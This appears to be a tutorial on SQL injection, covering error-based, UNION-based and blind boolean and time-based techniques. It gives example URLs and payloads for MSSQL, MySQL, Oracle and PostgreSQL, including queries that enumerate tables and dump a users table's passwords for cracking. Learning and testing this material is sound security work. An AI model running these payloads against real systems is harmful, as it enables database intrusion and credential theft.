Error-based SQL injection comes about when errors from the SQL database are exposed to the attacker by being embedded in application responses.

Example:

```ex
https://sql.exmaple.com/gallery.php?id=4'
```

In the above example we placed `'` and if database throws an SQL error we can confirm that it is vulnerable.

The exact error depends on the backend database. These errors can be controlled and by crafting input you can cause the error to contain data from the database itself. For example, if you are injecting into an integer input you can cause a type clash which will disclose information like this:

```ex
https://sql.exmaple.com/gallery.php?id=4 AND 1 in (SELECT @@version)
```

with input like this you’ll get an error along the following lines:

```ex
Conversion failed when converting the nvarchar value 'Microsoft SQL Server 2008 R2 (SP1) - 10.50.2500.0 (X64) Jun 17 2021 00:54:03 Copyright (c) Microsoft Corporation Standard Edition (64-bit) on Windows NT 6.2 <X64> (Build 9200: ) (Hypervisor)' to data type int
```

This works as the database attempts to convert the string to an integer, cannot, and throws an error that reveals the information.

Interesting right? Let's take another example:

site

```site
http://widgetshop.com/widget/?id=1
```

and we try with

```ex
http://widgetshop.com/widget/?id=1 or x=1
```

and it gives us an error

```ex
Exception Details: System.Data.SqlClient.SqlException: Invalid column name 'x'
```

We can possibly extract table names and other details with this

```extract
http://widgetshop.com/widget/?id=convert(int,(select top 1 name from sysobjects where id=(select top 1 id from (select top 1 id from sysobjects where xtype='u' order by id) sq order by id DESC)))
```

we get the error

```error
System.Data.SqlClient.SqlException: Conversion failed when converting the varchar value "TableName" to data type int.
```

Let’s deconstruct the query from the URL:

```decon
convert(int, (
   select top 1 name from sysobjects where id=(
     select top 1 id from (
       select top 1 id from sysobjects where xtype='u' order by id
     ) sq order by id DESC
   )
  )
 )
 ```

1. Working from the deepest nesting up, get the first record ID from the sysobjects table after ordering by ID.
2. From that collection, get the last ID (this is why it orders in descending) and pass that into the top select statement.
3. That top statement is then only going to take the table name and try to convert it to an integer.
4. The conversion to integer will almost certainly fail (please people, don’t name your tables “1” or “2” or any other integer for that matter!) and that exception then discloses the table name in the UI.

#### Union Based SQLi

Before understanding the exploitation part let's understand `Union` Clause.

The UNION operator is basically used to combine the results of two or more SELECT statements.

For using `UNION` each `SELECT` statement must have:

1. The same number of columns.

2. Similar data types.

3. The columns in each `SELECT` statement must also be in the same order.

Syntax:

```syntax
SELECT column_name(s) FROM table1
UNION
SELECT column_name(s) FROM table2; 
```

Now let's move on to Exploitation part :)

How to find number of columns using `UNION` ?

Use `NULLs` in place of the columns to determine how many columns there are, such as:

```null
UNION SELECT NULL --
UNION SELECT NULL, NULL --
UNION SELECT NULL, NULL, NULL --
UNION SELECT NULL, NULL, NULL, NULL --
UNION SELECT NULL, NULL, NULL, NULL, NULL --
UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL --
UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL --
```

and continue until you’ve determined how many columns there are – if you get the incorrect number of columns an error condition will occur and if you get the right number then the application will run unhindered. You can then swap out the NULL with datatypes to determine which ones are correct, such as:

```ex
UNION SELECT 'abcd', NULL, NULL, NULL --
UNION SELECT 1, NULL, NULL, NULL --
```

Work them out one at a time until you end up with something like this:

```ex
UNION SELECT 1, 'string', 'string', 'string' --
```

At this point you have a working SELECT statement where the output will be appended to the normal output the application gives!

If you’ve got a lot of columns and writing out all of those NULLs is too much like hard work.

Or we can also do this method too:

```another
site.com/cat.php?id=1 union 1 (error)
site.com/cat.php?id=1 union 1,2 (error)
site.com/cat.php?id=1 union 1,2,3 (error)
site.com/cat.php?id=1 union 1,2,3,4 (no error)
```

So we can conclude that there are 4 columns present in the database.

Alright, we got number of columns now we have to find vulnerable column.

Now, we have to check which column value is reflecting on the page let's see an example.

```ex
site.com/cat.php?id=1 union 1,2,3,4 (no error)
```

let's assume `2` is relecting on the page that means second column is vulnerable.

so we will replace "2" with the version

`site.com/cat.php?id=2 union select 1,@@version,3,4`

and we will get the version of the server let's exploit it more ;)

`cat.php?id=2 union select 1,user(),3,4`

Now we will dump the database:

`site.com/cat.php?id=2 union select 1,table_name,3,4 from information_Schema.tables`

Now we dump the columns:

`site.com/cat.php?id=2 union select 1,column_name,3,4 from information_Schema.columns`

Now the we will retrieve the columns:

`site.com/cat.php?id=2 union select 1,password,3,4 from users`

after that we can either get credentials in plain text or in hashed form so for that we can use john the ripper, hashcat or [crackstation](https://crackstation.net/)

There's Another way finding number of columns:

ORDER BY:

`site.com/cat.php?id=1 order by 10 --`

The thing is it will show error when the column number is high for example if we have 4 columns so it will show error upto 5

```ex
site.com/cat.php?id=1 order by 5 -- (error)
site.com/cat.php?id=1 order by 4 -- (no error)
```

So by that we can detect the number of columns.

#### Hints

1. Always use UNION with ALL because of image similar non-distinct field types. By default union tries to get records with distinct.

2. To get rid of unrequired records from left table use -1 or any not exist record search in the beginning of query (if injection is in WHERE). This can be critical if you are only getting one result at a time.

3. Use NULL in UNION injections for most data type instead of trying to guess string, date, integer etc. * Be careful in Blind situtaions may you can understand error is coming from DB or application itself. Because languages like ASP.NET generally throws errors while trying to use NULL values (because normally developers are not expecting to see NULL in a username field).

#### Finding Column Type

```ex
' union select sum(columntofind) from users-- (S)
Microsoft OLE DB Provider for ODBC Drivers error '80040e07'
[Microsoft][ODBC SQL Server Driver][SQL Server]The sum or average aggregate operation cannot take a varchar data type as an argument.
```

If you are not getting an error it means column is numeric.

Also you can use CAST() or CONVERT()

```ex
SELECT * FROM Table1 WHERE id = -1 UNION ALL SELECT null, null, NULL, NULL, convert(image,1), null, null,NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULl, NULL--
```

Other

```other
11223344) UNION SELECT NULL,NULL,NULL,NULL WHERE 1=2 –-    - No Error - Syntax is right. MS SQL Server Used. Proceeding.
11223344) UNION SELECT 1,NULL,NULL,NULL WHERE 1=2 –-       - No Error – First column is an integer.
11223344) UNION SELECT 1,2,NULL,NULL WHERE 1=2 --          - Error!   – Second column is not an integer.
11223344) UNION SELECT 1,'2',NULL,NULL WHERE 1=2 –-        - No Error – Second column is a string.
11223344) UNION SELECT 1,'2',3,NULL WHERE 1=2 –-           - Error!   – Third column is not an integer. ...
```

Other2

```other2
Microsoft OLE DB Provider for SQL Server error '80040e07'
Explicit conversion from data type int to image is not allowed.
```

We'll get convert() errors before union target errors ! So start with convert() then union

#### Inferential SQLi (Blind SQLi)

About Blind SQL Injections

In a quite good production application generally you can not see error responses on the page, so you can not extract data through Union attacks or error based attacks. You have to do use Blind SQL Injections attacks to extract data. There are two kind of Blind Sql Injections.

1. Normal Blind: You can not see a response in the page, but you can still determine result of a query from response or HTTP status code.
2. Totally Blind: You can not see any difference in the output in any kind. This can be an injection a logging function or similar. Not so common, though.

In normal blinds you can use if statements or abuse WHERE query in injection (generally easier).

In totally blinds you need to use some waiting functions and analyze response times. For this you can use `WAIT FOR DELAY` '0:0:10' in SQL Server, BENCHMARK() and `sleep(10)` in MySQL, `pg_sleep(10)` in PostgreSQL, and some PL/SQL tricks in ORACLE.

Types:

1. Blind-boolean-based SQLi
2. Blind-time-based SQLi

Let's learn both of them one by one.

#### Blind Boolean

If the application gracefully errors, and it’s not possible to combine queries with UNION, then an attacker can use inference to determine the answer to queries about the database. The payloads we used earlier to prove the existence of injection are simple examples of this:

```and
AND 1=2 --
AND 1=1 --
```

Essentially these are asking yes or no questions of the database and the result shows the answer.

1. "Does 1=1"? Yes of course it does and therefore the normal output of the application will be visible.

2. “Does 1=2"? No it does not and therefore there should be a noticeable chance, this could be in the response length, time of execution, or HTTP response code.

However we can expand up on this idea to ask more in-depth questions of the database, as long as we can phrase them as Yes/ No questions. For example, “Is the first letter of the current user the letter ‘a'”? That’d look something like:

```sub
AND SUBSTR(SELECT user_name(), 1, 1)='a' --
```

We can cycle through: b, c, d, e until we get a “true” response – then move on to the second character and so on. A time consuming and request intensive process but it can be automated quite easily with python (or Burp Intruder!)

The above check of

```and
AND 1=1 --
```

```ex
id = 5 'or 1 = (select db_name ()) - => The name of the Database of the current user.
can also be made by using

id = 5 'or 1 = (select system_user) - => The name of the owner of the given database.
id = 5 'and len (@@ version) = len (@@ version) - => true
id = 5 'and (@@ TEXTSIZE> @@ LANGID) - => true
```

For Example:

```ex
http://bounty/yadayada.asp?id=8888'+AND+(@@TEXTSIZE>@@LANGID)+AND+'1'+LIKE+'1 --> page will be loaded normally.
http://bounty/yadayada.asp?id=8888'+AND+(@@LANGID>@@TEXTSIZE)+'1'+LIKE+'1 --> page will be blank
```

What we are trying to do is run a existing Transact-SQL inside a MSSQL where its return types is either integer or smallint. And usually, these return types already have their own value.

Such as an example:

```ex
@@LANGID usually will be 0 for default (English language)
@@TEXTSIZE can be bigger than 1000
```

If Statements

Get response based on a if statement. This is one of the key points of Blind SQL Injection, also can be very useful to test simple stuff blindly and accurately. If statements of

MySQL

```mysql
IF(condition,true-part,false-part) (M)
SELECT IF(1=1,'true','false')
```

SQL Server

```sql
IF condition true-part ELSE false-part (S)
IF (1=1) SELECT 'true' ELSE SELECT 'false'
```

Oracle

```oracle
BEGIN
IF condition THEN true-part; ELSE false-part; END IF; END; (O)
IF (1=1) THEN dbms_lock.sleep(3); ELSE dbms_lock.sleep(0); END IF; END;
```

PostgreSQL

```post
SELECT CASE WHEN condition THEN true-part ELSE false-part END; (P)
SELECT CASE WEHEN (1=1) THEN 'A' ELSE 'B'END;
```

If Statement SQL Injection Attack Samples

if ((select user) = 'sa' OR (select user) = 'dbo') select 1 else select 1/0 (S)

This will throw an divide by zero error if current logged user is not "sa" or "dbo"

Examples:

These tests are simply good for blind sql injection and silent attacks.

```ex
    product.asp?id=4 (SMO)

    product.asp?id=5-1
    product.asp?id=4 OR 1=1
```

product.asp?name=Book

```ex
    product.asp?name=Bo'%2b'ok
    product.asp?name=Bo' || 'ok (OM)
    product.asp?name=Book' OR 'x'='x
```

Example:

```ex
http://widgetshop.com/widget/?id=1 and 1=2
```

Firstly, it might just throw an exception if no record is returned. Secondly, the app might not throw an exception but then it also won’t display a record either because the equivalency is false.

Now let’s try

```ex
1 and
(
 select top 1 substring(name, 1, 1) from sysobjects where id=(
     select top 1 id from (
           select top 1 id from sysobjects where xtype='u' order by id
       ) sq order by id desc
      )
 ) = 'a'
```

It’s now an equivalency test to see if the first character of the table name is an “a” (we’re assuming a case-insensitive collation here). If this request gives us the same result as “?id=1” then it confirms that the first table in sysobjects does indeed begin with an “a” as the equivalency has held true. If it gives us one of the earlier mentioned two scenarios (an error or shows no record), then we know that the table doesn’t begin with an “a” as no record has been returned.

Now all of that only gives us the first character of the table name from sysobjects, when you want the second character then the substring statement needs to progress to the next position:

```ex
select top 1 substring(name, 2, 1) from sysobjects where id=(
```

We can see it now starts at position 2 rather than position 1. Of course this is laborious; as well as enumerating through all the tables in sysobjects you end up enumerating through all the possible letters of the alphabet until you get a hit then you have to repeat the process for each character of the table name.

A better way to this would be:

```better
1 and
(
 select top 1 ascii(lower(substring(name, 1, 1))) from sysobjects where id=(
     select top 1 id from (
           select top 1 id from sysobjects where xtype='u' order by id
     ) sq order by id desc
   )
 ) > 109
```

Difference here in that what’s it doing is rather than checking for an individual character match, it’s looking for where that character falls in the ASCII table. Actually, it’s first lowercasing the table name to ensure we’re only dealing with 26 characters (assuming alpha-only naming, of course), then it’s taking the ASCII value of that character. In the example above, it then checks to see if the character is further down the table than the letter “m” (ASCII 109) and then of course the same potential outcomes as described earlier apply (either a record comes back or it doesn’t).

The main difference is that rather than potentially making 26 attempts at guessing the character (and consequently making 26 HTTP requests), it’s now going to exhaust all possibilities in only 5 – you just keep halving the possible ASCII character range until there’s only one possibility remaining.

For example, if greater than 109 then it must be between “n” and “z” so you split that (roughly) in half and go greater than 115. If that’s false then it must be between “n” and “s” so you split that bang in half and go greater than 112. That’s true so there’s only three chars left which you can narrow down to one in a max of two guesses. Bottom line is that the max of 26 guesses (call it average of 13) is now done in only 5 as you simply just keep halving the result set.

Another example from [Exploiting(pretty) blind SQL injection](https://isc.sans.edu/diary/Exploiting+%28pretty%29+blind+SQL+injections/20733).

SQL query through a request:

```request
http://10.10.10.10/application.aspx?queueID=743994
```

When the URL was opened regularly, in a browser, it was supposed to list certain transactions belonging to the numerical queueID in shown in the URL. The first issue was that the queueID we had to work with had no results! It just returned an empty page (and there was no Direct Object Reference here, we had to use that particular queueID).

Putting 743994 OR 1=1 or a UNION didn’t work either – the application expected exactly certain values in the columns (not only column types) and all we could get with both of these cases was a nice, generic error screen.

So, to prove that there was a SQL injection vulnerability, the following two queries can satisfy our needs:

```queue
queueID = 743994 AND 1=1
queueID = 743994 AND 1=2
queueID = 743995
queueID = 743994’
```

The first 3 queries all return a no results page. The last one returns the generic error page due to the SQL error that happened in the background. As with any blind SQL injection vulnerability, we need a true/false cases. The true case can be the no results page, while the false case can be the error page. The only question that remains is how to provoke the error page – it’s easy to do manually by entering a ‘ character, but how to do it in SQL, programmatically? Division by zero come to the rescue! If we divide something by zero, we can cause an SQL error, which will result with the generic error page.

Our exploitation now becomes the following:

```exploit
queueID = 743994 AND 1 = 1 / (select case when substr(banner, 1, 1) = 'A' then 1 else 0 end from (select banner from v$version where banner like '%Oracle%'))
```

The query takes the database banner from v$version (where it has string Oracle in it). Then, from that line the first character is examined (specified by the substr() call) and compared to the letter 'A'. If it is 'A', the query returns 1, otherwise it returns 0. This will either result in 1 = 1 / 1 or 1 = 1 / 0. The former will display the no results page while the latter will display the error page.

Another example from [Advanced Blind SQL Injection - Oracle](https://isc.sans.edu/diary/Advanced+blind+SQL+injection+%28with+Oracle+examples%29/6409)

#### Environment

In our test environment, the developer receives one parameter. We'll call it event and it can have two possible values, true or false. When called, it is used like this:

```ex
http://10.10.10.10/application.php?event=true
or
http://10.10.10.10/application.php?event=false
```

However, depending on the parameter (true or false or something else), the application will have different output and that allows us to see what's going on behind. In other words, if the parameter is "true" the output will be different from the case when the parameter is "abcd" (or "false"). And this is the basis of blind SQL injection – we want to make a difference between various SQL statements which will allow us to deduce the content of the database.

In typical blind SQL injection examples a timed delay is added to the attacker observes how long it takes for the query to execute. In this case it was not possible because we were dealing with stored procedures and some web application firewalls which prevented from using UNION statements.

#### Exploitation

As we don't know how exactly the stored procedure is called or what's the backend database, the easiest way to determine that is to split the input parameter:

```query
event = tr' || 'ue
```

This will cause the final input parameter to be 'tr' || 'ue' – the || operator in Oracle means concatenate so the parameter will actually be "true".

This shows that the database is evaluating the SQL statement which allows us to enter some if/then cases that will, in the end, allow us to read data from the database. So let's see how this is done in a bit more complex query:

```query
event = tr' || (select case when substr(banner, 1, 1) = 'A' then 'u' else 'X' end from (select banner from v$version where banner like '%Oracle%')) || 'e
```

1. The query takes the database banner from v$version (where it has string Oracle in it).
2. Then, from that line the first character is examined (specified by the substr() call) and compared to the letter 'A'.
3.If it is 'A', the query returns 'u', otherwise it returns 'X'.
4. Finally, this is concatenated so we have the following if/then case:

```if
If first character of the banner line containing string Oracle is 'A' return 'u' so the final string will be 'true'.
Otherwise, return 'X' so the final string will be 'trXe'.
```

Now, by examining the output of the application, it is possible to deduce if the query was successful or not.

Oracle has a handy table called all_sources which contains sources of stored procedures and functions. This may allow to retrieve source code!

SubstringToCharacterConversionToIncrementationOrDecrementationToCharacterConversionToStringConcatenation!!!!!!!

This might be useful in some scenarios

```substring
SUBSTRING(<thing>,X,1)
```

and then convert that to its numeric ASCII value:

```ascii
ASCII( SUBSTRING(<thing>,X,1) )
```

and then either increment or decrement that numeric value to the ASCII value of a character to get a result from:

```ascii
ASCII( SUBSTRING(<thing>,X,1) ) +/- Y
```

and then take that numeric ASCII value and convert THAT back to a character:

```char
CHAR( ASCII( SUBSTRING(<thing>,X,1) ) +/- Y )
```

and then perform string concatenation on that entire thing:

```concat
"We' + CHAR( ASCII( SUBSTRING(<thing>,X,1) ) +/- Y ) + 'dy"
```

and then see if I get "Wendy" back as search result or nothing at all.